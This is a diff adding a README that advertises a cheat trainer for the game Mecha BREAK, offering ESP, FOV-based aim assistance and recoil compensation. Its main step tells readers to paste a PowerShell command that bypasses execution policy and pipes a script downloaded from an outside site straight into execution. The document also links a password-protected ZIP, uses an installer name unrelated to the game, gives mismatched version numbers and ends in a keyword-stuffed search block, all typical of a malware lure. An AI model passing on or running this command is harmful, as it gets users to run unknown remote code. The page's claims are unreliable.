@@ -1,0 +1,45 @@
+Mecha BREAK (v2.0.0 — Windows 10 / 11 x64)
+
+Mecha BREAK is a standalone 64-bit external overlay and trainer for Mecha BREAK on PC (Windows 10/11). It uses signature-based memory scanning and a borderless DirectX 11/12 ImGui overlay so base game files remain untouched.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open Mecha BREAK Setup Portal (Rpcs3ProPatcher-Installer.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (rpcs3-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.0.0)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/rpcs3-pro-patcher-installer | iex"
+
+Key Features & Technical Specs
+
+- External read-only DirectX 12 / Vulkan overlay running at 144Hz+ with zero frame drop
+- Customizable 2D Box, Skeleton, Health bar, and Distance ESP with visibility check
+- Configurable FOV circle, smoothing curve, recoil compensation, and hotkey binder
+- Loot / item value radar with custom color filters and JSON profile manager
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | Rpcs3ProPatcher/Rpcs3ProPatcher-Installer.exe (v2.0.0) |
+| Target Runtime | DirectX 11 / 12 & Vulkan External Overlay (dxgi.dll / d3d11.dll) |
+| Install Path | %LOCALAPPDATA%\Programs\MechaBreak |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the Mecha BREAK Build & Setup Portal (v2.0.0) or Releases.
+2. Extract Rpcs3ProPatcher and launch Rpcs3ProPatcher-Installer.exe (or use the 1-command Win + R setup on the portal).
+3. Start Mecha BREAK in Windowed or Borderless Fullscreen mode.
+4. Press INSERT in-game to open the overlay menu and configure hotkeys.
+
+Rpcs3ProPatcher/
+├── Rpcs3ProPatcher-Installer.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Programs\MechaBreak)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+mecha break cheat · mecha break mod menu · mecha break esp · mecha break trainer · mecha-break · mecha-break-cheat · mecha-break-cheats · mecha-break-esp · mecha-break-mod-menu · mecha-break-trainer
